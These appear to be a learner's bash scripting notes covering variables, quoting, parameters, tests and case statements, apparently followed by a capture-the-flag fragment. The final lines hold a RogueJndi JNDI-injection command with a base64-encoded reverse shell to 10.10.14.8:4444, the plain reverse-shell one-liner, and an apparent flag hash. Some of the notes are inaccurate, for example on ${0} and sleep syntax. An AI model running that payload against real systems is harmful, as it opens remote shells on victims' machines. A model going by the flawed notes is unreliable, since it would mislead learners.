
`type -a 'item'` - find out if its a shell builtin or user command

if user command use man
 
if shell builtin use help
 
Use command to assign to variable = `VARIABLE=$(cmd)`  

Can also be `VARIABLE=`\``cmd`\`
 
Assign value using variable  

`WORD='script'`

variable = `${WORD}` or `$WORD`  

When you want to display the variable's value you use `$Variable`  
 
Single quotes prevent expansion of variables 
 
Double quotes provides the interpretation of the variable 
 
		`TEST='1'`
  
		`echo "$TEST"` provides 1
  
		`echo '$TEST'` provides $test
  
	If we want to append text to the end of the variable you need to use `{}`
 
	`echo "${WORD}ing"` provides Scripting
 
	Combining variables also require that you use the `{`
 
Changing the value stored in a variable (Reassignment)

	`ENDING='ed'`

	`echo "$ENDING"` ed
 
	`ENDING='ing'`
 
	`echo "$ENDING"` ing
 
parameter - variable being used inside the shell script

`;` is command separator or enter key

arguement - data passed into the shel lscritp

	arguement used in command line becoems the value stored in a parameter
 
`${0}` - first positional parameter - what is typed in the cmd line to execute the script - returns output of the command

`${1}` - value fo the first arguement passed to the script on the cmd

expression = `[[ expression ]]

	Display if user is root or not
```
if [[ "${UID}" -eq 0 ]]
		then
			echo 'You are root'
		else 
			echo 'You are not root'
		fi 
```
-eq - equal to 

-lt - less than

le - less than or equal to

gt - greater than

ge - greater than or equal to


`${?}` exit status variable of the most recently executed command

read input `read ` `-p` -passes the input onto value 

	ex. `read -p 'Entire input: ' variable_name`
 
useradd `-c` -comment for user `-m`(make home directory) `"username"`

shuf - shuffles entire lines

fold - wrap each input line to match space 

which - finds which path x command will execute from

	`which head` - finds location of head cmd
 
hash - `hash` - changes shell remembered locations

basename - strips out directory and suffix from filenames - aka display only filename - doesnt do smart checking

dirname - strips last component from file name - aka display only directory  - doesnt do smart checking

!`letter` - goes back to last command that started with X letter

`${@}` - puts each input as seperate words

`${*}` - puts each input as one word

`${#}` - represents the number of arguments

`sleep -s m h d` - delays command for -seconds -minutes -hours -days

`shift` - each time the cmd runs, ${#} goes down one

`readonly [variable]=[variable assignment]` - read only variable 

`getopts` - used matching pattern to get options from input

	`getopts input options OPTION`
 
	`while GET`
 
`bash pgrep -x` - check processes

Redirection


### Case

```
case [input] in
value) command` ;;

;; - block ender
esac - case finish
```

When trying to do math in bash format is `$(( NUM + NUM ))`

num can be variables as well but dont need ${} 


________________________________________________________________________
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.14.8"

echo 'bash -c bash -i >&/dev/tcp/10.10.14.8/4444 0>&1' |
base64

6ced1a6a89e666c0620cdb10262ba127

